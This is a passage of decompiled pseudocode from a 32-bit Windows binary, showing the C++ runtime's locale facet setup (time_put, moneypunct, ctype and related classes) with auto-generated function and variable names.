  int v9; // [esp+50h] [ebp-4h]

  v2 = 0;
  Block = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0xCu);
    Block = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      *v3 = &std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
      v2 = 1;
      v3[2] = 0;
      sub_43C7AA(v5);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}
// 491300: using guessed type void *std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';

//----- (00438272) --------------------------------------------------------
int __cdecl sub_438272(_DWORD *a1, std::locale *a2)
{
  char v2; // bl
  _DWORD *v3; // esi
  const char *v4; // eax
  int v5; // eax
  void *v7[13]; // [esp+10h] [ebp-44h] BYREF
  _DWORD *v8; // [esp+44h] [ebp-10h]
  int v9; // [esp+50h] [ebp-4h]

  v2 = 0;
  v8 = 0;
  if ( a1 && !*a1 )
  {
    v3 = operator new(0xCu);
    v8 = v3;
    v9 = 0;
    if ( v3 )
    {
      v4 = std::locale::c_str(a2);
      v5 = std::_Locinfo::_Locinfo((std::_Locinfo *)v7, v4);
      v3[1] = 0;
      *v3 = &std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
      v2 = 1;
      v3[2] = 0;
      sub_43C7AA(v5);
    }
    else
    {
      v3 = 0;
    }
    *a1 = v3;
    if ( (v2 & 1) != 0 )
      sub_42DB80(v7);
  }
  return 5;
}
// 490F6C: using guessed type void *std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';

//----- (0043C3C1) --------------------------------------------------------
int __thiscall sub_43C3C1(int this, int a2, char a3)
{
  struct lconv *v3; // eax
  int v4; // esi
  struct lconv *v5; // edi
  char int_frac_digits; // al
  int result; // eax
  char *mon_grouping; // [esp-10h] [ebp-5Ch]
  _Cvtvec v9; // [esp+10h] [ebp-3Ch] BYREF
  int v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v10 = this;
  qmemcpy((void *)(this + 44), _Getcvt(&v9), 0x2Cu);
  v3 = localeconv();
  v4 = v10;
  v5 = v3;
  *(_DWORD *)(v10 + 8) = 0;
  *(_DWORD *)(v4 + 16) = 0;
  *(_DWORD *)(v4 + 20) = 0;
  *(_DWORD *)(v4 + 24) = 0;
  mon_grouping = v3->mon_grouping;
  v11 = 0;
  *(_DWORD *)(v4 + 8) = std::_Maklocstr<char>(mon_grouping);
  std::_Mpunct<unsigned short>::_Getvals<unsigned short>(0, v5);
  if ( *(_BYTE *)(v4 + 40) )
    int_frac_digits = v5->int_frac_digits;
  else
    int_frac_digits = v5->frac_digits;
  *(_DWORD *)(v4 + 28) = int_frac_digits;
  if ( (unsigned int)int_frac_digits >= 0x7F )
    *(_DWORD *)(v4 + 28) = 0;
  unknown_libname_59(v4 + 32, v5->p_sep_by_space, v5->p_cs_precedes, v5->p_sign_posn);
  result = unknown_libname_59(v4 + 36, v5->n_sep_by_space, v5->n_cs_precedes, v5->n_sign_posn);
  if ( a3 )
  {
    result = 1987586852;
    *(_DWORD *)(v4 + 32) = 1987586852;
    *(_DWORD *)(v4 + 36) = 1987586852;
  }
  return result;
}
// 4352D7: using guessed type _DWORD __stdcall std::_Mpunct<unsigned short>::_Getvals<unsigned short>(_DWORD, _DWORD);
// 43D84C: using guessed type _DWORD __stdcall unknown_libname_59(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043C48C) --------------------------------------------------------
int __thiscall sub_43C48C(int this, int a2, char a3)
{
  struct lconv *v3; // eax
  int v4; // esi
  struct lconv *v5; // edi
  char int_frac_digits; // al
  int result; // eax
  char *mon_grouping; // [esp-10h] [ebp-5Ch]
  _Cvtvec v9; // [esp+10h] [ebp-3Ch] BYREF
  int v10; // [esp+3Ch] [ebp-10h]
  int v11; // [esp+48h] [ebp-4h]

  v10 = this;
  qmemcpy((void *)(this + 44), _Getcvt(&v9), 0x2Cu);
  v3 = localeconv();
  v4 = v10;
  v5 = v3;
  *(_DWORD *)(v10 + 8) = 0;
  *(_DWORD *)(v4 + 16) = 0;
  *(_DWORD *)(v4 + 20) = 0;
  *(_DWORD *)(v4 + 24) = 0;
  mon_grouping = v3->mon_grouping;
  v11 = 0;
  *(_DWORD *)(v4 + 8) = std::_Maklocstr<char>(mon_grouping);
  unknown_libname_58(0, v5);
  if ( *(_BYTE *)(v4 + 40) )
    int_frac_digits = v5->int_frac_digits;
  else
    int_frac_digits = v5->frac_digits;
  *(_DWORD *)(v4 + 28) = int_frac_digits;
  if ( (unsigned int)int_frac_digits >= 0x7F )
    *(_DWORD *)(v4 + 28) = 0;
  unknown_libname_59(v4 + 32, v5->p_sep_by_space, v5->p_cs_precedes, v5->p_sign_posn);
  result = unknown_libname_59(v4 + 36, v5->n_sep_by_space, v5->n_cs_precedes, v5->n_sign_posn);
  if ( a3 )
  {
    result = 1987586852;
    *(_DWORD *)(v4 + 32) = 1987586852;
    *(_DWORD *)(v4 + 36) = 1987586852;
  }
  return result;
}
// 43C32F: using guessed type _DWORD __stdcall unknown_libname_58(_DWORD, _DWORD);
// 43D84C: using guessed type _DWORD __stdcall unknown_libname_59(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043C73A) --------------------------------------------------------
int __thiscall sub_43C73A(_DWORD *this, std::_Locinfo *a2)
{
  int result; // eax

  this[2] = 0;
  this[3] = 0;
  this[4] = 0;
  sub_4353CB((int)this, 0, a2);
  result = _Getdateorder();
  this[5] = result;
  return result;
}
// 446D61: using guessed type int _Getdateorder(void);

//----- (0043C7AA) --------------------------------------------------------
void __stdcall sub_43C7AA(int a1)
{
  void *Block; // [esp+4h] [ebp-4h] BYREF

  Block = _W_Gettnames();
  std::_Timevec::operator=(&Block);
  free(Block);
}
// 436BF0: using guessed type _DWORD __stdcall std::_Timevec::operator=(_DWORD);

//----- (0043CDA1) --------------------------------------------------------
void __cdecl sub_43CDA1(std::_Locinfo *a1, int a2, struct std::locale::_Locimp *a3, std::locale *a4)
{
  struct std::locale::facet *v4; // ebx
  int v5; // eax
  struct std::locale::facet *v6; // eax
  struct std::locale::facet *v7; // esi
  unsigned int v8; // esi
  struct std::locale::facet *v9; // eax
  unsigned int v10; // esi
  struct std::locale::facet *v11; // eax
  unsigned int v12; // esi
  struct std::locale::facet *v13; // eax
  struct std::locale::facet *v14; // eax
  struct std::locale::facet *v15; // esi
  struct std::locale::facet *v16; // eax
  unsigned int v17; // esi
  struct std::locale::facet *v18; // eax
  unsigned int v19; // esi
  struct std::locale::facet *v20; // eax
  int v21; // eax
  _Collvec *v22; // eax
  struct std::locale::facet *v23; // esi
  unsigned int v24; // esi
  struct std::locale::facet *v25; // eax
  char v26; // dl
  unsigned int v27; // esi
  struct std::locale::facet *v28; // eax
  struct std::locale::facet *v29; // eax
  unsigned int v30; // esi
  struct std::locale::facet *v31; // eax
  unsigned int v32; // esi
  struct std::locale::facet *v33; // eax
  struct std::locale::facet *v34; // eax
  struct std::locale::facet *v35; // esi
  struct std::locale::facet *v36; // eax
  struct std::locale::facet *v37; // esi
  struct std::locale::facet *v38; // eax
  unsigned int v39; // esi
  struct std::locale::facet *v40; // eax
  unsigned int v41; // esi
  struct std::locale::facet *v42; // eax
  unsigned int v43; // esi
  struct std::locale::facet *v44; // eax
  unsigned int v45; // esi
  _DWORD *v46; // eax
  struct std::locale::facet *v47; // eax
  struct std::locale::facet *v48; // eax
  struct std::locale::facet *v49; // esi
  struct std::locale::facet *v50; // eax
  unsigned int v51; // esi
  struct std::locale::facet *v52; // eax
  unsigned int v53; // esi
  struct std::locale::facet *v54; // eax
  unsigned int v55; // [esp+18h] [ebp-10h]
  int v56; // [esp+18h] [ebp-10h]
  unsigned int v57; // [esp+18h] [ebp-10h]
  int v58; // [esp+18h] [ebp-10h]
  int v59; // [esp+18h] [ebp-10h]
  int v60; // [esp+18h] [ebp-10h]

  v4 = 0;
  if ( (a2 & 2) != 0 )
  {
    v5 = std::locale::id::operator unsigned int(&unk_4FFA24);
    if ( a4 )
    {
      v8 = v5;
      v9 = sub_435C7D(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v9, v8);
    }
    else
    {
      v55 = v5;
      v6 = (struct std::locale::facet *)operator new(0x44u);
      v7 = v6;
      if ( v6 )
      {
        *((_DWORD *)v6 + 1) = 0;
        *(_DWORD *)v6 = &std::ctype<unsigned short>::`vftable';
        std::ctype<wchar_t>::_Init(a1);
      }
      else
      {
        v7 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v7, v55);
    }
  }
  if ( (a2 & 8) != 0 )
  {
    v10 = std::locale::id::operator unsigned int(&unk_4FFB1C);
    if ( a4 )
    {
      v16 = sub_43637B(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v16, v10);
      v17 = std::locale::id::operator unsigned int(&unk_4FFB20);
      v18 = sub_4364A5(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v18, v17);
      v19 = std::locale::id::operator unsigned int(&unk_4FFB24);
      v20 = sub_4365CF(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v20, v19);
    }
    else
    {
      v11 = (struct std::locale::facet *)operator new(8u);
      if ( v11 )
      {
        *((_DWORD *)v11 + 1) = 0;
        *(_DWORD *)v11 = &std::num_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
      }
      else
      {
        v11 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v11, v10);
      v12 = std::locale::id::operator unsigned int(&unk_4FFB20);
      v13 = (struct std::locale::facet *)operator new(8u);
      if ( v13 )
      {
        *((_DWORD *)v13 + 1) = 0;
        *(_DWORD *)v13 = &std::num_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
      }
      else
      {
        v13 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v13, v12);
      v56 = std::locale::id::operator unsigned int(&unk_4FFB24);
      v14 = (struct std::locale::facet *)operator new(0x18u);
      v15 = v14;
      if ( v14 )
      {
        *((_DWORD *)v14 + 1) = 0;
        *(_DWORD *)v14 = &std::numpunct<unsigned short>::`vftable';
        std::numpunct<unsigned short>::_Init(a1, 0);
      }
      else
      {
        v15 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v15, v56);
    }
  }
  if ( ((1 << sub_4377EA(0, 0) >> 1) & a2) != 0 )
  {
    v21 = std::locale::id::operator unsigned int(&unk_4FFB28);
    if ( a4 )
    {
      v24 = v21;
      v25 = sub_435B53(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v25, v24);
    }
    else
    {
      v57 = v21;
      v22 = (_Collvec *)operator new(0x10u);
      v23 = (struct std::locale::facet *)v22;
      if ( v22 )
      {
        v22->_LocaleName = 0;
        v22->_Page = (unsigned int)&std::collate<unsigned short>::`vftable';
        v22[1] = _Getcoll();
      }
      else
      {
        v23 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v23, v57);
    }
  }
  v26 = a2;
  if ( (a2 & 0x20) != 0 )
  {
    v27 = std::locale::id::operator unsigned int(&unk_4FFB2C);
    if ( a4 )
    {
      v29 = sub_435DA7(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v29, v27);
    }
    else
    {
      v28 = (struct std::locale::facet *)operator new(8u);
      if ( v28 )
      {
        *((_DWORD *)v28 + 1) = 0;
        *(_DWORD *)v28 = &std::messages<unsigned short>::`vftable';
      }
      else
      {
        v28 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v28, v27);
    }
    v26 = a2;
  }
  if ( (v26 & 4) != 0 )
  {
    v30 = std::locale::id::operator unsigned int(&unk_4FFB30);
    if ( a4 )
    {
      v38 = sub_435ED1(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v38, v30);
      v39 = std::locale::id::operator unsigned int(&unk_4FFB34);
      v40 = sub_435FFD(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v40, v39);
      v41 = std::locale::id::operator unsigned int(&unk_4FFB38);
      v42 = sub_4361BC(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v42, v41);
      v43 = std::locale::id::operator unsigned int(&unk_4FFB3C);
      v44 = sub_436127(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v44, v43);
    }
    else
    {
      v31 = (struct std::locale::facet *)operator new(8u);
      if ( v31 )
      {
        *((_DWORD *)v31 + 1) = 0;
        *(_DWORD *)v31 = &std::money_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
      }
      else
      {
        v31 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v31, v30);
      v32 = std::locale::id::operator unsigned int(&unk_4FFB34);
      v33 = (struct std::locale::facet *)operator new(8u);
      if ( v33 )
      {
        *((_DWORD *)v33 + 1) = 0;
        *(_DWORD *)v33 = &std::money_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
      }
      else
      {
        v33 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v33, v32);
      v58 = std::locale::id::operator unsigned int(&unk_4FFB38);
      v34 = (struct std::locale::facet *)operator new(0x58u);
      v35 = v34;
      if ( v34 )
      {
        *((_DWORD *)v34 + 1) = 0;
        *(_DWORD *)v34 = &std::_Mpunct<unsigned short>::`vftable';
        *((_BYTE *)v34 + 40) = 0;
        sub_43C3C1((int)v34, (int)a1, 0);
        *(_DWORD *)v35 = &std::moneypunct<unsigned short,0>::`vftable';
      }
      else
      {
        v35 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v35, v58);
      v59 = std::locale::id::operator unsigned int(&unk_4FFB3C);
      v36 = (struct std::locale::facet *)operator new(0x58u);
      v37 = v36;
      if ( v36 )
      {
        *((_DWORD *)v36 + 1) = 0;
        *(_DWORD *)v36 = &std::_Mpunct<unsigned short>::`vftable';
        *((_BYTE *)v36 + 40) = 1;
        sub_43C3C1((int)v36, (int)a1, 0);
        *(_DWORD *)v37 = &std::moneypunct<unsigned short,1>::`vftable';
      }
      else
      {
        v37 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v37, v59);
    }
    v26 = a2;
  }
  if ( (v26 & 0x10) != 0 )
  {
    v45 = std::locale::id::operator unsigned int(&unk_4FFB40);
    if ( a4 )
    {
      v50 = sub_4366F9(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v50, v45);
      v51 = std::locale::id::operator unsigned int(&unk_4FFB44);
      v52 = sub_436823(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v52, v51);
    }
    else
    {
      v46 = operator new(0x44u);
      if ( v46 )
        v47 = (struct std::locale::facet *)sub_436A30(v46, a1, 0);
      else
        v47 = 0;
      std::locale::_Locimp::_Locimp_Addfac(a3, v47, v45);
      v60 = std::locale::id::operator unsigned int(&unk_4FFB44);
      v48 = (struct std::locale::facet *)operator new(0xCu);
      v49 = v48;
      if ( v48 )
      {
        *((_DWORD *)v48 + 1) = 0;
        *(_DWORD *)v48 = &std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
        *((_DWORD *)v48 + 2) = 0;
        sub_43C7AA((int)a1);
      }
      else
      {
        v49 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v49, v60);
    }
  }
  if ( (a2 & 2) != 0 )
  {
    v53 = std::locale::id::operator unsigned int(&unk_4FFA2C);
    if ( a4 )
    {
      v54 = sub_435A29(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v54, v53);
    }
    else
    {
      if ( operator new(0x34u) )
        v4 = (struct std::locale::facet *)std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(a1, 0);
      std::locale::_Locimp::_Locimp_Addfac(a3, v4, v53);
    }
  }
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 4369C2: using guessed type _DWORD __stdcall std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(_DWORD, _DWORD);
// 43C557: using guessed type _DWORD __stdcall std::ctype<wchar_t>::_Init(_DWORD);
// 43C590: using guessed type _DWORD __stdcall std::numpunct<unsigned short>::_Init(_DWORD, _DWORD);
// 490F2C: using guessed type void *std::ctype<unsigned short>::`vftable';
// 491140: using guessed type void *std::num_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
// 49117C: using guessed type void *std::num_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
// 4911AC: using guessed type void *std::numpunct<unsigned short>::`vftable';
// 4911D0: using guessed type void *std::collate<unsigned short>::`vftable';
// 4911EC: using guessed type void *std::messages<unsigned short>::`vftable';
// 491208: using guessed type void *std::money_get<unsigned short,std::istreambuf_iterator<unsigned short>>::`vftable';
// 491220: using guessed type void *std::money_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';
// 491238: using guessed type void *std::_Mpunct<unsigned short>::`vftable';
// 49126C: using guessed type void *std::moneypunct<unsigned short,0>::`vftable';
// 4912A0: using guessed type void *std::moneypunct<unsigned short,1>::`vftable';
// 491300: using guessed type void *std::time_put<unsigned short,std::ostreambuf_iterator<unsigned short>>::`vftable';

//----- (0043D2D2) --------------------------------------------------------
void __cdecl sub_43D2D2(std::_Locinfo *a1, int a2, struct std::locale::_Locimp *a3, std::locale *a4)
{
  struct std::locale::facet *v4; // ebx
  int v5; // eax
  struct std::locale::facet *v6; // eax
  struct std::locale::facet *v7; // esi
  unsigned int v8; // esi
  struct std::locale::facet *v9; // eax
  unsigned int v10; // esi
  struct std::locale::facet *v11; // eax
  unsigned int v12; // esi
  struct std::locale::facet *v13; // eax
  struct std::locale::facet *v14; // eax
  struct std::locale::facet *v15; // esi
  struct std::locale::facet *v16; // eax
  unsigned int v17; // esi
  struct std::locale::facet *v18; // eax
  unsigned int v19; // esi
  struct std::locale::facet *v20; // eax
  int v21; // eax
  _Collvec *v22; // eax
  struct std::locale::facet *v23; // esi
  unsigned int v24; // esi
  struct std::locale::facet *v25; // eax
  char v26; // dl
  unsigned int v27; // esi
  struct std::locale::facet *v28; // eax
  struct std::locale::facet *v29; // eax
  unsigned int v30; // esi
  struct std::locale::facet *v31; // eax
  unsigned int v32; // esi
  struct std::locale::facet *v33; // eax
  struct std::locale::facet *v34; // eax
  struct std::locale::facet *v35; // esi
  struct std::locale::facet *v36; // eax
  struct std::locale::facet *v37; // esi
  struct std::locale::facet *v38; // eax
  unsigned int v39; // esi
  struct std::locale::facet *v40; // eax
  unsigned int v41; // esi
  struct std::locale::facet *v42; // eax
  unsigned int v43; // esi
  struct std::locale::facet *v44; // eax
  unsigned int v45; // esi
  _DWORD *v46; // eax
  struct std::locale::facet *v47; // eax
  struct std::locale::facet *v48; // eax
  struct std::locale::facet *v49; // esi
  struct std::locale::facet *v50; // eax
  unsigned int v51; // esi
  struct std::locale::facet *v52; // eax
  unsigned int v53; // esi
  struct std::locale::facet *v54; // eax
  unsigned int v55; // [esp+18h] [ebp-10h]
  int v56; // [esp+18h] [ebp-10h]
  unsigned int v57; // [esp+18h] [ebp-10h]
  int v58; // [esp+18h] [ebp-10h]
  int v59; // [esp+18h] [ebp-10h]
  int v60; // [esp+18h] [ebp-10h]

  v4 = 0;
  if ( (a2 & 2) != 0 )
  {
    v5 = std::locale::id::operator unsigned int(&unk_4FFA30);
    if ( a4 )
    {
      v8 = v5;
      v9 = sub_435D12(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v9, v8);
    }
    else
    {
      v55 = v5;
      v6 = (struct std::locale::facet *)operator new(0x44u);
      v7 = v6;
      if ( v6 )
      {
        *((_DWORD *)v6 + 1) = 0;
        *(_DWORD *)v6 = &std::ctype<wchar_t>::`vftable';
        std::ctype<wchar_t>::_Init(a1);
      }
      else
      {
        v7 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v7, v55);
    }
  }
  if ( (a2 & 8) != 0 )
  {
    v10 = std::locale::id::operator unsigned int(&unk_4FFAF4);
    if ( a4 )
    {
      v16 = sub_436410(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v16, v10);
      v17 = std::locale::id::operator unsigned int(&unk_4FFAF8);
      v18 = sub_43653A(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v18, v17);
      v19 = std::locale::id::operator unsigned int(&unk_4FFAFC);
      v20 = sub_436664(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v20, v19);
    }
    else
    {
      v11 = (struct std::locale::facet *)operator new(8u);
      if ( v11 )
      {
        *((_DWORD *)v11 + 1) = 0;
        *(_DWORD *)v11 = &std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
      }
      else
      {
        v11 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v11, v10);
      v12 = std::locale::id::operator unsigned int(&unk_4FFAF8);
      v13 = (struct std::locale::facet *)operator new(8u);
      if ( v13 )
      {
        *((_DWORD *)v13 + 1) = 0;
        *(_DWORD *)v13 = &std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
      }
      else
      {
        v13 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v13, v12);
      v56 = std::locale::id::operator unsigned int(&unk_4FFAFC);
      v14 = (struct std::locale::facet *)operator new(0x18u);
      v15 = v14;
      if ( v14 )
      {
        *((_DWORD *)v14 + 1) = 0;
        *(_DWORD *)v14 = &std::numpunct<wchar_t>::`vftable';
        std::numpunct<wchar_t>::_Init(a1, 0);
      }
      else
      {
        v15 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v15, v56);
    }
  }
  if ( ((1 << sub_43788C(0, 0) >> 1) & a2) != 0 )
  {
    v21 = std::locale::id::operator unsigned int(&unk_4FFB00);
    if ( a4 )
    {
      v24 = v21;
      v25 = sub_435BE8(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v25, v24);
    }
    else
    {
      v57 = v21;
      v22 = (_Collvec *)operator new(0x10u);
      v23 = (struct std::locale::facet *)v22;
      if ( v22 )
      {
        v22->_LocaleName = 0;
        v22->_Page = (unsigned int)&std::collate<wchar_t>::`vftable';
        v22[1] = _Getcoll();
      }
      else
      {
        v23 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v23, v57);
    }
  }
  v26 = a2;
  if ( (a2 & 0x20) != 0 )
  {
    v27 = std::locale::id::operator unsigned int(&unk_4FFB04);
    if ( a4 )
    {
      v29 = sub_435E3C(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v29, v27);
    }
    else
    {
      v28 = (struct std::locale::facet *)operator new(8u);
      if ( v28 )
      {
        *((_DWORD *)v28 + 1) = 0;
        *(_DWORD *)v28 = &std::messages<wchar_t>::`vftable';
      }
      else
      {
        v28 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v28, v27);
    }
    v26 = a2;
  }
  if ( (v26 & 4) != 0 )
  {
    v30 = std::locale::id::operator unsigned int(&unk_4FFB08);
    if ( a4 )
    {
      v38 = sub_435F66(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v38, v30);
      v39 = std::locale::id::operator unsigned int(&unk_4FFB0C);
      v40 = sub_436092(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v40, v39);
      v41 = std::locale::id::operator unsigned int(&unk_4FFB10);
      v42 = sub_4362E6(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v42, v41);
      v43 = std::locale::id::operator unsigned int(&unk_4FFB14);
      v44 = sub_436251(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v44, v43);
    }
    else
    {
      v31 = (struct std::locale::facet *)operator new(8u);
      if ( v31 )
      {
        *((_DWORD *)v31 + 1) = 0;
        *(_DWORD *)v31 = &std::money_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
      }
      else
      {
        v31 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v31, v30);
      v32 = std::locale::id::operator unsigned int(&unk_4FFB0C);
      v33 = (struct std::locale::facet *)operator new(8u);
      if ( v33 )
      {
        *((_DWORD *)v33 + 1) = 0;
        *(_DWORD *)v33 = &std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
      }
      else
      {
        v33 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v33, v32);
      v58 = std::locale::id::operator unsigned int(&unk_4FFB10);
      v34 = (struct std::locale::facet *)operator new(0x58u);
      v35 = v34;
      if ( v34 )
      {
        *((_DWORD *)v34 + 1) = 0;
        *(_DWORD *)v34 = &std::_Mpunct<wchar_t>::`vftable';
        *((_BYTE *)v34 + 40) = 0;
        sub_43C48C((int)v34, (int)a1, 0);
        *(_DWORD *)v35 = &std::moneypunct<wchar_t,0>::`vftable';
      }
      else
      {
        v35 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v35, v58);
      v59 = std::locale::id::operator unsigned int(&unk_4FFB14);
      v36 = (struct std::locale::facet *)operator new(0x58u);
      v37 = v36;
      if ( v36 )
      {
        *((_DWORD *)v36 + 1) = 0;
        *(_DWORD *)v36 = &std::_Mpunct<wchar_t>::`vftable';
        *((_BYTE *)v36 + 40) = 1;
        sub_43C48C((int)v36, (int)a1, 0);
        *(_DWORD *)v37 = &std::moneypunct<wchar_t,1>::`vftable';
      }
      else
      {
        v37 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v37, v59);
    }
    v26 = a2;
  }
  if ( (v26 & 0x10) != 0 )
  {
    v45 = std::locale::id::operator unsigned int(&unk_4FFB18);
    if ( a4 )
    {
      v50 = sub_43678E(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v50, v45);
      v51 = std::locale::id::operator unsigned int(&unk_4FFAF0);
      v52 = sub_4368B8(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v52, v51);
    }
    else
    {
      v46 = operator new(0x44u);
      if ( v46 )
        v47 = (struct std::locale::facet *)sub_436A63(v46, a1, 0);
      else
        v47 = 0;
      std::locale::_Locimp::_Locimp_Addfac(a3, v47, v45);
      v60 = std::locale::id::operator unsigned int(&unk_4FFAF0);
      v48 = (struct std::locale::facet *)operator new(0xCu);
      v49 = v48;
      if ( v48 )
      {
        *((_DWORD *)v48 + 1) = 0;
        *(_DWORD *)v48 = &std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
        *((_DWORD *)v48 + 2) = 0;
        sub_43C7AA((int)a1);
      }
      else
      {
        v49 = 0;
      }
      std::locale::_Locimp::_Locimp_Addfac(a3, v49, v60);
    }
  }
  if ( (a2 & 2) != 0 )
  {
    v53 = std::locale::id::operator unsigned int(&unk_4FFA28);
    if ( a4 )
    {
      v54 = sub_435ABE(a4);
      std::locale::_Locimp::_Locimp_Addfac(a3, v54, v53);
    }
    else
    {
      if ( operator new(0x34u) )
        v4 = (struct std::locale::facet *)std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(a1, 0);
      std::locale::_Locimp::_Locimp_Addfac(a3, v4, v53);
    }
  }
}
// 430A7B: using guessed type int __thiscall std::locale::id::operator unsigned int(_DWORD);
// 4369F9: using guessed type _DWORD __stdcall std::codecvt<wchar_t,char,_Mbstatet>::codecvt<wchar_t,char,_Mbstatet>(_DWORD, _DWORD);
// 43C557: using guessed type _DWORD __stdcall std::ctype<wchar_t>::_Init(_DWORD);
// 43C669: using guessed type _DWORD __stdcall std::numpunct<wchar_t>::_Init(_DWORD, char);
// 490EEC: using guessed type void *std::ctype<wchar_t>::`vftable';
// 490F6C: using guessed type void *std::time_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
// 490F80: using guessed type void *std::num_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
// 490FBC: using guessed type void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
// 490FEC: using guessed type void *std::numpunct<wchar_t>::`vftable';
// 491010: using guessed type void *std::collate<wchar_t>::`vftable';
// 49102C: using guessed type void *std::messages<wchar_t>::`vftable';
// 491048: using guessed type void *std::money_get<wchar_t,std::istreambuf_iterator<wchar_t>>::`vftable';
// 491060: using guessed type void *std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
// 491078: using guessed type void *std::_Mpunct<wchar_t>::`vftable';
// 4910AC: using guessed type void *std::moneypunct<wchar_t,0>::`vftable';
// 4910E0: using guessed type void *std::moneypunct<wchar_t,1>::`vftable';

//----- (0043D955) --------------------------------------------------------
int __stdcall sub_43D955(
        int a1,
        int a2,
        int a3,
        char a4,
        int a5,
        unsigned __int16 a6,
        char a7,
        void *Src,
        int a9,
        int a10,
        int a11,
        unsigned int a12,
        unsigned int a13,
        unsigned __int16 a14)
{
  struct std::_Facet_base *v14; // edi
  unsigned int v15; // edi
  int *v16; // eax
  char *v17; // eax
  int *v18; // edi
  wchar_t v19; // cx
  unsigned int v20; // esi
  int v21; // eax
  int v22; // esi
  char v23; // dl
  unsigned int v24; // ecx
  unsigned int i; // esi
  int v26; // edx
  unsigned int v27; // eax
  unsigned int v28; // esi
  unsigned int v29; // esi
  int v30; // eax
  int *v31; // eax
  int v32; // ecx
  int v33; // edx
  unsigned int v34; // eax
  int v35; // eax
  int v36; // eax
  int v37; // eax
  int v38; // eax
  void **v39; // eax
  int *v40; // eax
  unsigned __int16 v41; // ax
  int *v42; // eax
  int v43; // ecx
  int v44; // edx
  void **v45; // eax
  unsigned int v46; // eax
  int *v47; // eax
  unsigned __int16 v48; // ax
  void **v49; // ecx
  void **v50; // eax
